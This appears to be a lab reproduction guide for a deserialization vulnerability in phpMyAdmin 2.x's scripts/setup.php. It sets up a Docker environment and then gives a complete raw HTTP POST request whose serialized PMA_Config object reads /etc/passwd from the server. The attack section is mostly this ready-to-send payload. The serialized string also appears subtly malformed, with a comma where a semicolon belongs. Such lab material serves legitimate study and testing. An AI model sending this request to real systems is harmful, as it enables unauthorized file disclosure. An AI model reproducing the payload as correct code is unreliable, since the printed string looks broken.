# phpmyadmin scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433)

There is a deserialization vulnerability in phpmyadmin 2.x that allows an attacker to read arbitrary files or execute arbitrary code.

## Environment Building

Run the following command to start phpmyadmin:

```
Docker-compose up -d
```

After the environment starts, visit `http://your-ip:8080` and you will see the phpmyadmin home page. Because there is no connection to the database, we will report an error at this time, but the use of this vulnerability is not related to the database, so it is ignored.

## Vulnerability recurrence

Send the following packet to read `/etc/passwd`:

```
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

Action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```

![](1.png)